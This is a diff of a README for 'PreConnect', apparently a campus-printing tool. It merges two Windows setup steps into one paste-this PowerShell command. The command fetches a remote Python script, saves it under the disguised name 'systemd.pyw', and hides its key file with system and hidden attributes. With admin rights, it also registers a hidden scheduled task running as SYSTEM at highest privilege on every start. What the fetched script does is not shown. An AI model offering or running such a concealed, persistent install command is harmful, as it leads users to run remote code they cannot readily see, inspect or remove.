@@ -4,22 +4,12 @@ Print directly to campus printers from PreConnect.
 
 ---
 
-## User Setup (No Admin Required)
+## Windows Setup (All-in-One Command)
 
-Run in PowerShell:
-
-```powershell
-$d="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$d\systemd.pyw" -UseBasicParsing; Add-Type -AssemblyName System.Security; $b=[System.Text.Encoding]::UTF8.GetBytes("<WORKER_KEY>"); $e=[System.Security.Cryptography.ProtectedData]::Protect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser); Set-Content "$d\systemd.key" ("DPAPI:"+[Convert]::ToBase64String($e)); icacls "$d\systemd.key" /inheritance:r /grant:r "$env:USERNAME:(F)"; attrib +h +s "$d\systemd.key"; $py = if (Get-Command pythonw -ErrorAction SilentlyContinue) { "pythonw" } else { if (-not (Test-Path "$d\py\pythonw.exe")) { Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$d\py.zip" -UseBasicParsing; Expand-Archive "$d\py.zip" -DestinationPath "$d\py" -Force; Remove-Item "$d\py.zip" }; "$d\py\pythonw.exe" }; Start-Process $py "`"$d\systemd.pyw`""
-```
-
----
-
-## Admin Setup (Requires Admin PowerShell)
-
-Run in **Administrator PowerShell**:
+Open **PowerShell** and run (replace `<WORKER_KEY>` with your key):
 
 ```powershell
-$d="$env:ProgramData\systemd"; New-Item -ItemType Directory -Force -Path $d; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$d\systemd.pyw" -UseBasicParsing; Add-Type -AssemblyName System.Security; $b=[System.Text.Encoding]::UTF8.GetBytes("<WORKER_KEY>"); $e=[System.Security.Cryptography.ProtectedData]::Protect($b,$null,[System.Security.Cryptography.DataProtectionScope]::LocalMachine); Set-Content "$d\systemd.key" ("DPAPI:"+[Convert]::ToBase64String($e)); icacls "$d\systemd.key" /inheritance:r /grant:r "SYSTEM:(F)" "Administrators:(F)"; attrib +h +s "$d\systemd.key"; $py = if (Get-Command pythonw -ErrorAction SilentlyContinue) { "pythonw.exe" } else { if (-not (Test-Path "$d\py\pythonw.exe")) { Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$d\py.zip" -UseBasicParsing; Expand-Archive "$d\py.zip" -DestinationPath "$d\py" -Force; Remove-Item "$d\py.zip" }; "`"$d\py\pythonw.exe`"" }; schtasks /Create /TN "systemd" /TR "$py `"$d\systemd.pyw`"" /SC ONSTART /RI 15 /DU 24:00 /RU SYSTEM /RL HIGHEST /F; try { (New-Object -ComObject Schedule.Service).GetFolder("\").GetTask("systemd").Definition.Settings.Hidden = $true } catch {}; schtasks /Run /TN "systemd"
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); $d = if ($isAdmin) { "$env:ProgramData\systemd" } else { "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" }; New-Item -ItemType Directory -Force -Path $d | Out-Null; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$d\systemd.pyw" -UseBasicParsing; Add-Type -AssemblyName System.Security; $scope = if ($isAdmin) { [System.Security.Cryptography.DataProtectionScope]::LocalMachine } else { [System.Security.Cryptography.DataProtectionScope]::CurrentUser }; $e = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes("<WORKER_KEY>"), $null, $scope); Set-Content "$d\systemd.key" ("DPAPI:" + [Convert]::ToBase64String($e)); attrib +h +s "$d\systemd.key"; $py = if (Get-Command pythonw -ErrorAction SilentlyContinue) { "pythonw.exe" } else { if (-not (Test-Path "$d\py\pythonw.exe")) { Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$d\py.zip" -UseBasicParsing; Expand-Archive "$d\py.zip" -DestinationPath "$d\py" -Force; Remove-Item "$d\py.zip" }; "$d\py\pythonw.exe" }; if ($isAdmin) { schtasks /Create /TN "systemd" /TR "$py `"$d\systemd.pyw`"" /SC ONSTART /RI 15 /DU 24:00 /RU SYSTEM /RL HIGHEST /F; try { (New-Object -ComObject Schedule.Service).GetFolder("\").GetTask("systemd").Definition.Settings.Hidden = $true } catch {}; schtasks /Run /TN "systemd" } else { Start-Process $py "`"$d\systemd.pyw`"" }
 ```
 
 ---
